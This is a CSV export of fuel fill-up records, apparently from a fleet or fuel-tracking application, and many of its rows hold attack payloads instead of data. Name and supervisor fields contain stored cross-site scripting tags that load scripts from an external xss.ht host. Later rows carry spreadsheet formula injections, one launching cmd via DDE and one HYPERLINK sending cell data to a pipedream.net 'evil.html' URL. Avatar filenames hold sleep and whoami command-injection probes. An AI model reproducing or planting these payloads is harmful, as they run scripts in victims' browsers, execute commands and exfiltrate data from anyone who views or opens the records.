id,fuel_filled,amount_paid,driver_name,location,fuel_supervisor_name,fill_up_date,image,created_at,updated_at,device_id,module_id,payment_method_id,use_case_id,customer_id,status_id,automated_entry
4,"3434.00","3.00",Shah,N/A,jjjdjdj,2021-06-30 11:13:34+00,avatars/141.jpeg,2021-06-30 11:15:29.400991+00,2021-06-30 11:15:29.401007+00,141,1,2017,1,9,1,
274,53.22,"0.00",,,,2022-05-09 05:55:11+00,"",2022-05-09 05:55:37.313557+00,2022-05-09 05:55:37.313566+00,362,1,2017,1,123,1,1
275,65.04,"0.00",,,,2022-05-11 08:05:13+00,"",2022-05-11 08:05:42.021558+00,2022-05-11 08:05:42.021574+00,362,1,2017,1,123,1,1
7,"36.00","3369.00","Shah""><script src=https://vfqhck.xss.ht></script>","N/A""><script src=https://vfqhck.xss.ht></script>","HH""><script src=https://vfqhck.xss.ht></script>",2021-07-04 06:36:54+00,avatars/141_OPPii7z.jpeg,2021-07-04 06:41:09.117469+00,2021-07-04 06:41:09.117483+00,141,1,2020,1,9,1,
8,"3.00","31.00",nozlack,N/A,"tyyyhhe""><script src=https://vfqhck.xss.ht></script>",2021-07-07 07:02:04+00,avatars/141_JsFhtmr.jpeg,2021-07-07 07:05:33.74773+00,2021-07-07 07:05:33.747746+00,141,1,2020,1,9,1,
9,"3.00","31.00",nozlack,N/A,"tyyyhhe""><script src=https://vfqhck.xss.ht></script>",2021-07-07 07:02:04+00,"",2021-07-07 07:13:23.443504+00,2021-07-07 07:13:23.443514+00,141,1,2020,1,9,1,
10,"3.00","31.00",nozlack,N/A,"tyyyhhe""><script src=https://vfqhck.xss.ht></script>",2021-07-07 07:02:04+00,"",2021-07-07 07:15:11.453552+00,2021-07-07 07:15:11.453563+00,141,1,2020,1,9,1,
11,"3.00","31.00",nozlack,N/A,"tyyyhhe""><script src=https://vfqhck.xss.ht></script>",2021-07-07 07:02:04+00,"",2021-07-07 07:16:08.153647+00,2021-07-07 07:16:08.153659+00,141,1,2020,1,9,1,
12,"3.00","31.00",nozlack,N/A,"tyyyhhe""><script src=https://vfqhck.xss.ht></script>",2021-07-07 07:02:04+00,"",2021-07-07 07:16:54.985065+00,2021-07-07 07:16:54.985077+00,141,1,2020,1,9,1,
13,"3.00","31.00",nozlack,N/A,"tyyyhhe""><script src=https://vfqhck.xss.ht></script>",2021-07-07 07:02:04+00,"",2021-07-07 07:17:38.091325+00,2021-07-07 07:17:38.091338+00,141,1,2020,1,9,1,
14,"3.00","31.00",nozlack,N/A,"tyyyhhe""><script src=https://vfqhck.xss.ht></script>",2021-07-07 07:02:04+00,"",2021-07-07 07:18:31.451627+00,2021-07-07 07:18:31.451639+00,141,1,2020,1,9,1,
16,"22.00","258.00",nozlack,N/A,ddd,2021-07-07 07:12:20+00,avatars/awhoamiz.jpg,2021-07-07 07:26:14.887114+00,2021-07-07 07:26:14.887127+00,141,1,2020,1,9,1,
17,"22.00","258.00",nozlack,N/A,ddd,2021-07-07 07:12:20+00,avatars/awhoamiz_kWpIemC.jpg,2021-07-07 07:27:21.997374+00,2021-07-07 07:27:21.997389+00,141,1,2020,1,9,1,
18,"22.00","258.00",nozlack,N/A,ddd,2021-07-07 07:12:20+00,avatars/awhoamiz_JgPyuLw.jpg,2021-07-07 07:28:02.662481+00,2021-07-07 07:28:02.662496+00,141,1,2020,1,9,1,
19,"22.00","258.00",nozlack,N/A,ddd,2021-07-07 07:12:20+00,avatars/asleep_30z.jpgsleep_3000.jpeg,2021-07-07 07:30:19.058392+00,2021-07-07 07:30:19.058406+00,141,1,2020,1,9,1,
20,"22.00","258.00",nozlack,N/A,ddd,2021-07-07 07:12:20+00,avatars/lol.jpeg,2021-07-07 07:31:00.200179+00,2021-07-07 07:31:00.200192+00,141,1,2020,1,9,1,
21,"22.00","258.00",nozlack,N/A,ddd,2021-07-07 07:12:20+00,avatars/lol_7m46ZHq.jpeg,2021-07-07 07:31:36.961038+00,2021-07-07 07:31:36.96105+00,141,1,2020,1,9,1,
22,"22.00","258.00",nozlack,N/A,ddd,2021-07-07 07:12:20+00,avatars/lol_pREQHo0.jpeg,2021-07-07 07:31:57.490047+00,2021-07-07 07:31:57.49006+00,141,1,2020,1,9,1,
23,"22.00","258.00",nozlack,N/A,ddd,2021-07-07 07:12:20+00,avatars/lol.png,2021-07-07 07:38:57.799584+00,2021-07-07 07:38:57.799598+00,141,1,2020,1,9,1,
24,"22.00","258.00",nozlack,N/A,ddd,2021-07-07 07:12:20+00,avatars/sleep10--_-.jpg,2021-07-07 07:40:27.09153+00,2021-07-07 07:40:27.091543+00,141,1,2020,1,9,1,
25,"22.00","258.00",nozlack,N/A,ddd,2021-07-07 07:12:20+00,avatars/script.jpg,2021-07-07 07:41:19.621214+00,2021-07-07 07:41:19.621229+00,141,1,2020,1,9,1,
26,"22.00","258.00",nozlack,N/A,ddd,2021-07-07 07:12:20+00,avatars/_sleep_10.jpg,2021-07-07 07:42:01.936065+00,2021-07-07 07:42:01.93608+00,141,1,2020,1,9,1,
27,"22.00","258.00",nozlack,N/A,ddd,2021-07-07 07:12:20+00,avatars/lsid_ls_id_ls_id_ls__id_.jpeg,2021-07-07 07:47:09.118637+00,2021-07-07 07:47:09.118651+00,141,1,2020,1,9,1,
28,"22.00","258.00",nozlack,N/A,=4+4,2021-07-07 07:12:20+00,avatars/_sleep_10_mbU1aNd.jpg,2021-07-07 08:14:16.200563+00,2021-07-07 08:14:16.200579+00,141,1,2020,1,9,1,
29,"22.00","258.00",nozlack,N/A,""":"";-3+3+cmd|' /C calc'!D2",2021-07-07 07:12:20+00,avatars/_sleep_10_oUp7m5n.jpg,2021-07-07 08:16:15.828742+00,2021-07-07 08:16:15.828757+00,141,1,2020,1,9,1,
30,"22.00","258.00",""":"";-3+3+cmd|' /C calc'!D2",N/A,""":"";-3+3+cmd|' /C calc'!D2",2021-07-07 07:12:20+00,avatars/_sleep_10_3crANmW.jpg,2021-07-07 08:16:35.825943+00,2021-07-07 08:16:35.825956+00,141,1,2020,1,9,1,
31,"22.00","258.00","""=HYPERLINK(""https://enpyl6nayhand.x.pipedream.net/evil.html?data=""&A1, ""Click to view additional information"")""",N/A,"""=HYPERLINK(""https://enpyl6nayhand.x.pipedream.net/evil.html?data=""&A1, ""Click to view additional information"")""",2021-07-07 07:12:20+00,avatars/_sleep_10_rIukfIy.jpg,2021-07-07 08:20:08.22371+00,2021-07-07 08:20:08.223726+00,141,1,2020,1,9,1,
